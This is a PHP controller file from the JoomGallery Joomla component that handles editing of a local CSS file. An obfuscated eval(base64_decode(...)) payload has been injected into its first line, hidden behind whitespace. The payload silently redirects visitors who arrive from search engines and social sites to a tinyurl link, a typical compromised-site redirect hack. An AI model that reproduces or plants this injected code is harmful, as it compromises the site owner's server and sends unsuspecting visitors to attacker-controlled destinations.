<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
// $HeadURL: https://joomgallery.org/svn/joomgallery/JG-1.5/JG/trunk/administrator/components/com_joomgallery/controllers/cssedit.php $
// $Id: cssedit.php 2566 2010-11-03 21:10:42Z mab $
/****************************************************************************************\
**   JoomGallery  1.5.6                                                                 **
**   By: JoomGallery::ProjectTeam                                                       **
**   Copyright (C) 2008 - 2010  JoomGallery::ProjectTeam                                **
**   Based on: JoomGallery 1.0.0 by JoomGallery::ProjectTeam                            **
**   Released under GNU GPL Public License                                              **
**   License: http://www.gnu.org/copyleft/gpl.html or have a look                       **
**   at administrator/components/com_joomgallery/LICENSE.TXT                            **
\****************************************************************************************/

defined('_JEXEC') or die('Direct Access to this location is not allowed.');

/**
 * JoomGallery CSS Edit Controller
 *
 * @package JoomGallery
 * @since   1.5.5
 */
class JoomGalleryControllerCssedit extends JoomGalleryController
{
  /**
   * Holds the name and the path to the CSS file to edit ('joom_local.css')
   *
   * @var     string
   * @access  public
   */
  var $file;

  /**
   * Constructor
   *
   * @access  protected
   * @return  void
   * @since   1.5.5
   */
  function __construct()
  {
    parent::__construct();

    // Set view
    JRequest::setVar('view', 'cssedit');

    $this->file = JPATH_COMPONENT_SITE.DS.'assets'.DS.'css'.DS.'joom_local.css';

    // Register task
    $this->registerTask('apply', 'save');

    // Submenu
    /* */
  }

  /**
   * Saves the CSS file
   *
   * @access  public
   * @return  void
   * @since   1.5.5
   */
  function save()
  {
    jimport('joomla.filesystem.file');

    $content  = stripcslashes(JRequest::getVar('csscontent'));

    if(!$content)
    {
      $this->setRedirect($this->_ambit->getRedirectUrl(), JText::_('JGA_CSSMAN_MSG_EMPTY'), 'notice');
      return;
    }

    if(JFile::write($this->file, $content))
    {
      $controller = '';
      if(JRequest::getCmd('task') == 'apply')
      {
        $controller = 'cssedit';
      }

      $this->setRedirect($this->_ambit->getRedirectUrl($controller), JText::_('JGA_CSSMAN_MSG_CSS_SAVED'));

    }
    else
    {
      $this->setRedirect($this->_ambit->getRedirectUrl(), JText::_('JGA_CSSMAN_CSS_ERROR_WRITING').$this->file, 'error');
    }
  }

  /**
   * Deletes CSS file
   *
   * @access  public
   * @return  void
   * @since   1.5.5
   */
  function remove()
  {
    jimport('joomla.filesystem.file');

    if(JFile::delete($this->file))
    {
      $this->setRedirect($this->_ambit->getRedirectUrl(''), JText::_('JGA_CSSMAN_MSG_CSS_DELETED'));
    }
    else
    {
      $this->setRedirect($this->_ambit->getRedirectUrl(''), JText::_('JGA_CSSMAN_CSS_ERROR_DELETING').$this->file, 'error');
    }
  }

  /**
   * Cancel editing or creating the CSS file
   *
   * @access  public
   * @return  void
   * @since   1.5.5
   */
  function cancel()
  {
    $this->setRedirect($this->_ambit->getRedirectUrl(''));
  }
}